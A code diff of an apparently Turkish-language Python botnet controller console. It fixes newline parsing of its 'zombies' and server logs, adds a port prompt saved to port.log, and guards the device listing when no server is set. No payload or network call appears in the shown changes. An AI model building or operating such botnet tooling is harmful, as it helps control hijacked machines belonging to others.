@@ -137,6 +137,9 @@ try:
                 if line == "\n":
                     continue
                 elif "." in line or "http" in line or "https" in line or "://" in line or ":/" in line:
+                    if "\n" in line:
+                        line = line.split("\n")
+                        line = line[0]
                     zombies += 1
                     zombies_list.append(line)
                 else:
@@ -146,6 +149,9 @@ try:
                 if line == "\n":
                     continue
                 elif "." in line or "http" in line or "https" in line or "://" in line or ":/" in line:
+                    if "\n" in line:
+                        line = line.split("\n")
+                        line = line[0]
                     servers += 1
                     servers_list.append(line)
                 else:
@@ -360,6 +366,9 @@ while True:
                 if line == "\n":
                     continue
                 elif "." in line or "http" in line or "https" in line or "://" in line or ":/" in line:
+                    if "\n" in line:
+                        line = line.split("\n")
+                        line = line[0]
                     if line in zombies_list:
                         continue
                     else:
@@ -679,14 +688,18 @@ while True:
                 pass
     elif choices == 3:
         while True:
-            server_name = int(input(Fore.CYAN+'[?]'+Fore.RESET+' Lütfen sunucu için IP adresini girin: '))
+            server_name = input(Fore.CYAN+'[?]'+Fore.RESET+' Lütfen sunucu için IP adresini girin: ').strip(" ")
+            server_port = input(Fore.CYAN+'[?]'+Fore.RESET+f' Lütfen "{server_name}" için bağlantı noktası adresini girin (Port): ').strip(" ")
             if "." in server_name:
                 try:
                     with open(current_path+'/zombies/server.log', 'a') as srv:
                         srv.write(str(server_name)+'\n')
+                    with open(current_path+'/zombies/port.log', 'a') as prt:
+                        prt.write(server_name+':'+server_port)
                 except:
                     pass
                 print(Fore.YELLOW+'[+]'+Fore.RESET+' Başarıyla Sunucu Yazıldı: "'+str(server_name)+'"')
+                server = str(server_name)
                 break
             else:
                 print(Fore.RED+'[-]'+Fore.RESET+' Geçersiz IP adresi!')
@@ -698,6 +711,9 @@ while True:
                     if line == "\n":
                         continue
                     elif "." in line or "http" in line or "https" in line or "://" in line or ":/" in line:
+                        if "\n" in line:
+                            line = line.split("\n")
+                            line = line[0]
                         if line in zombies_list:
                             continue
                         else:
@@ -709,11 +725,14 @@ while True:
             pass
         print(Fore.YELLOW+'[+]'+Fore.RESET+' Botnet yenilendi!')
     elif choices == 1:
-        devs = 0
-        print('----------------------------------------')
-        for device in zombies_list:
-            devs += 1
-            print(Fore.BLUE+'[i]'+Fore.RESET+f' Device No|{devs}: "'+device+'"')
+        if server == "Sunucu Yok" or server == "":
+            print(Fore.RED+'[-]'+Fore.RESET+' Sunucu yok!')
+        else:
+            devs = 0
+            print('----------------------------------------')
+            for device in zombies_list:
+                devs += 1
+                print(Fore.BLUE+'[i]'+Fore.RESET+f' Device No|{devs}: "'+device+'"')
     else:
         print(Fore.RED+'[-]'+Fore.RESET+' Tanınmayan komut/numara: "'+str(choices)+'"')
     
